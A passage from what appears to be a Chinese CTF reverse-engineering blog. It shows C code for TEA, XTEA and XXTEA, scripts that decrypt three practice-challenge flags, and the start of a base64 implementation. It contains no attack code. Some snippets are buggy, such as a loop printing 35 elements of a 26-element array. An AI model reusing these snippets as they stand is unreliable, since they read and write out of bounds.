k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：1347371722 925494771<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.020 s<br>Press any key to continue.</p></blockquote><h3 id="xtea加密"><a href="#xtea加密" class="headerlink" title="xtea加密"></a>xtea加密</h3><p>XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/2.png"><br>算法实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] *&#x2F;</span><br><span class="line"> </span><br><span class="line">void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, delta&#x3D;0x9E3779B9;</span><br><span class="line">    for (i&#x3D;0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 +&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v1 +&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], delta&#x3D;0x9E3779B9, sum&#x3D;delta*num_rounds;</span><br><span class="line">    for (i&#x3D;0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">        v0 -&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D;&#123;1,2&#125;;</span><br><span class="line">    uint32_t const k[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    unsigned int r&#x3D;32;&#x2F;&#x2F;num_rounds建议取值为32</span><br><span class="line">    &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</span><br><span class="line">    &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decipher(r, v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：1345390024 2801624574<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.034 s<br>Press any key to continue.</p></blockquote><h3 id="xxtea加密"><a href="#xxtea加密" class="headerlink" title="xxtea加密"></a>xxtea加密</h3><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版 ，设计者是Roger Needham, David Wheeler<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/3.png"><br>算法实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#define DELTA 0x9e3779b9</span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><span class="line"> </span><br><span class="line">void btea(uint32_t *v, int n, uint32_t const key[4])</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t y, z, sum;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    if (n &gt; 1)            &#x2F;* Coding Part *&#x2F;</span><br><span class="line">    &#123;</span><br><span class="line">        rounds &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        sum &#x3D; 0;</span><br><span class="line">        z &#x3D; v[n-1];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            sum +&#x3D; DELTA;</span><br><span class="line">            e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;0; p&lt;n-1; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y &#x3D; v[p+1];</span><br><span class="line">                z &#x3D; v[p] +&#x3D; MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y &#x3D; v[0];</span><br><span class="line">            z &#x3D; v[n-1] +&#x3D; MX;</span><br><span class="line">        &#125;</span><br><span class="line">        while (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (n &lt; -1)      &#x2F;* Decoding Part *&#x2F;</span><br><span class="line">    &#123;</span><br><span class="line">        n &#x3D; -n;</span><br><span class="line">        rounds &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        sum &#x3D; rounds*DELTA;</span><br><span class="line">        y &#x3D; v[0];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;n-1; p&gt;0; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z &#x3D; v[p-1];</span><br><span class="line">                y &#x3D; v[p] -&#x3D; MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z &#x3D; v[n-1];</span><br><span class="line">            y &#x3D; v[0] -&#x3D; MX;</span><br><span class="line">            sum -&#x3D; DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        while (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D; &#123;1,2&#125;;</span><br><span class="line">    uint32_t const k[4]&#x3D; &#123;2,2,3,4&#125;;</span><br><span class="line">    int n&#x3D; 2; &#x2F;&#x2F;n的绝对值表示v的长度，取正表示加密，取负表示解密</span><br><span class="line">    &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数</span><br><span class="line">    &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：3238569099 2059193138<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.369 s<br>Press any key to continue.</p></blockquote><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p><a href="https://pan.baidu.com/s/1jZogTyTC3aKMmBO9DyaEgg">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/tea3.PNG"></p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k, int n)</span><br><span class="line">&#123;</span><br><span class="line">int j;</span><br><span class="line">    for(j&#x3D;0;j&lt;n;j+&#x3D;2)</span><br><span class="line">    &#123;</span><br><span class="line">        uint32_t v0&#x3D;v[j], v1&#x3D;v[j+1], sum&#x3D;0xC6EF3720, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">        uint32_t delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">        uint32_t k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">        for (i&#x3D;0; i&lt;32; i++)</span><br><span class="line">        &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">            v1 -&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">            sum -&#x3D; delta;</span><br><span class="line">        &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">        v[j]&#x3D;v0; v[j+1]&#x3D;v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int </span><br><span class="line">data[24]&#x3D;&#123;0xdd970cc4,0x818d6166,0xb47035f4,0xd099de74,0xb50c0b58,0x2cecb013,0x20ca556f,0x35301e68,0x457b62b2,0x91926c85,0xe15a695a,0x2e550212,0xdd0426e,0x839dc37,0xba150ea0,0x2aad9fd7,0x6889d7e2,0x82f201d7,0x3374d877,0x2e17ed88,0x35196e88,0x236ab4b9,0x75c5e88,0xdb68bf4b&#125;;</span><br><span class="line">int i;</span><br><span class="line">unsigned int k[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">int n&#x3D;24;</span><br><span class="line">decrypt(data, k,n);</span><br><span class="line">for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{YOU_FIND_THE_FLAG!}</p></blockquote><h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p><a href="https://pan.baidu.com/s/1bAgbw0TAJMC_5uWO_UwqIQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xtea3.PNG"></p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void decipher(uint32_t v[2], uint32_t const key[4], int n)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    int num_rounds&#x3D;32;</span><br><span class="line">    int j;</span><br><span class="line">    for(j&#x3D;0;j&lt;n;j+&#x3D;2)</span><br><span class="line">    &#123;</span><br><span class="line">        uint32_t v0&#x3D;v[j], v1&#x3D;v[j+1], delta&#x3D;0x9E3779B9, sum&#x3D;delta*num_rounds;</span><br><span class="line">        for (i&#x3D;0; i &lt; num_rounds; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 -&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">            sum -&#x3D; delta;</span><br><span class="line">            v0 -&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">        &#125;</span><br><span class="line">        v[j]&#x3D;v0; v[j+1]&#x3D;v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int data[26]&#x3D;&#123;0x27275d99,0x3c11048b,0x467297e3,0xc09af6b8,0xed74946a,0x2f994350,0xf045f43e,0x81b107b8,0x899a9e3,0x2bc3d1b6,0x6f738cdb,0xfd9b7c7c,0xe52275fe,0x21586050,0x6bd3d095,0xc1edbe2f,0x6f1f00b1,0x1613f009,0x6109db9,0xfef136d2,0x98dd74f9,0x750a3393,0xb93cc79c,0x35df2918,0xba1f4f1c,0x5936c0c8&#125;;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">unsigned int k[4]&#x3D;&#123;1,2,3,4&#125;;</span><br><span class="line">int n&#x3D;26;</span><br><span class="line">decipher(data, k, n);</span><br><span class="line">for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{luoyu-1224.github.io}</p></blockquote><h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p><a href="https://pan.baidu.com/s/1Kd_G9dwbLA7vP5yolYECaA">附件链接</a> 提取码：0000<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea2.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea1.png"></p><p><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/xxtea3.PNG"></p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span><br><span class="line"></span><br><span class="line">int check[26]&#x3D;&#123;0xecc7f567,0xecc3d63f,0xfd046ee,0x4231e0b8,0x2aa73061,0x376a03f2,0xef400f49,0x78b22f96,0x3c80565a,0x53cf31ae,0x1bf54a05,0x43ac56f8,0xeb92b3fd,0xd4abe89b,0xfd3b88db,0x6c65b706,0xbe48072b,0x3e445861,0x247e6144,0x79b5a5af,0x3e42487b,0x2ac44245,0x15e908f0,0x120e8173,0x69fea947,0x70917ef7&#125;;</span><br><span class="line"></span><br><span class="line">int btea(int* v, int n, unsigned int k[4])       </span><br><span class="line">&#123;</span><br><span class="line">    unsigned int z&#x3D;v[n-1], y&#x3D;v[0], sum&#x3D;0, e, DELTA&#x3D;0x9e3779b9;</span><br><span class="line">int p, q ;</span><br><span class="line">    if (n &gt; 1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 加密过程 *&#x2F;</span><br><span class="line">        q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        while (q-- &gt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">    sum +&#x3D; DELTA;</span><br><span class="line">e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;0; p&lt;n-1; p++)</span><br><span class="line">&#123;</span><br><span class="line">y &#x3D; v[p+1];</span><br><span class="line">z &#x3D; v[p] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            y &#x3D; v[0];</span><br><span class="line">z &#x3D; v[n-1] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">        return 0 ;</span><br><span class="line">    &#125;</span><br><span class="line">else if (n &lt; -1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 解密过程 *&#x2F;</span><br><span class="line">        n &#x3D; -n;</span><br><span class="line">q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">sum &#x3D; q*DELTA ;</span><br><span class="line">        while (sum !&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;n-1; p&gt;0; p--) </span><br><span class="line">&#123;</span><br><span class="line">z &#x3D; v[p-1];</span><br><span class="line">y &#x3D; v[p] -&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            z &#x3D; v[n-1]; </span><br><span class="line">y &#x3D; v[0] -&#x3D; MX;</span><br><span class="line">sum -&#x3D; DELTA; </span><br><span class="line">&#125;</span><br><span class="line">        return 0; </span><br><span class="line">&#125;  </span><br><span class="line">return 1; </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">unsigned int k[4]&#x3D;&#123;1,2,3,4&#125;;</span><br><span class="line">int n&#x3D;26;</span><br><span class="line">btea(check, -n, k);</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;35;i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%c&quot;,check[i]);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><blockquote><p>flag{xxtea_is_interesting}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64在逆向中的应用</title>
      <link href="2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="base64的原理和C语言实现"><a href="#base64的原理和C语言实现" class="headerlink" title="base64的原理和C语言实现"></a>base64的原理和C语言实现</h1><a id="more"></a><p>原理参考此篇文章 <a href="https://blog.csdn.net/wo541075754/article/details/81734770">链接</a></p><p>C语言代码实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char table[65]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char padding_char&#x3D;&#39;&#x3D;&#39;;</span><br><span class="line"></span><br><span class="line">int findchr(char *array,char ch)&#123;</span><br><span class="line">    for(int i&#x3D;0;i&lt;strlen(array);i++)&#123;</span><br><span class="line">        if(array[i]&#x3D;&#x3D;ch)&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_encode(char *src,char *result)&#123;</span><br><span class="line">    int fill_bit&#x3D;0;</span><br><span class="line">    int data_length;</span><br><span class="line">    int result_length;</span><br><span class="line">    int index;</span><br><span class="line">    _Bool full&#x3D;trunc;</span><br><span class="line">    data_length&#x3D;strlen(src);</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;length:%d\n&quot;,data_length);</span><br><span class="line">    fill_bit&#x3D;((3-strlen(src)%3)%3); &#x2F;&#x2F;计算未满字节，注意除去3的情况</span><br><span class="line">    for(int k&#x3D;0;k&lt;fill_bit;k++)&#123;</span><br><span class="line">        src[data_length+k]&#x3D;&#39;\0&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;data_length;i+&#x3D;3)&#123;</span><br><span class="line">        index&#x3D;src[i]&gt;&gt;2;</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;((src[i]&amp;3)&lt;&lt;4)+(src[i+1]&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;((src[i+1]&amp;15)&lt;&lt;2)+(src[i+2]&gt;&gt;6);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        index&#x3D;(src[i+2]&amp;63);</span><br><span class="line">        result[j++]&#x3D;table[index];</span><br><span class="line">        &#x2F;&#x2F;&lt;&lt; &gt;&gt; 运算符的优先级低于+ -，注意加括号</span><br><span class="line">    &#125;</span><br><span class="line">    result_length&#x3D;strlen(result);</span><br><span class="line">    for(int k&#x3D;0;k&lt;fill_bit;k++)&#123;</span><br><span class="line">        result[result_length-1-k]&#x3D;padding_char; &#x2F;&#x2F;把多余的A字符替换为&#x3D;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_decode(char *src,char *result)&#123;</span><br><span class="line">    int base_len;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    base_len&#x3D;strlen(src);</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;length:%d\n&quot;,base_len);</span><br><span class="line">    for(int i&#x3D;0;i&lt;base_len;i++)&#123;</span><br><span class="line">        if(src[i]&#x3D;&#x3D;padding_char)</span><br><span class="line">            src[i]&#x3D;&#39;A&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;%s\n&quot;,src);</span><br><span class="line">    for(int i&#x3D;0;i&lt;base_len;i+&#x3D;4)&#123;</span><br><span class="line">        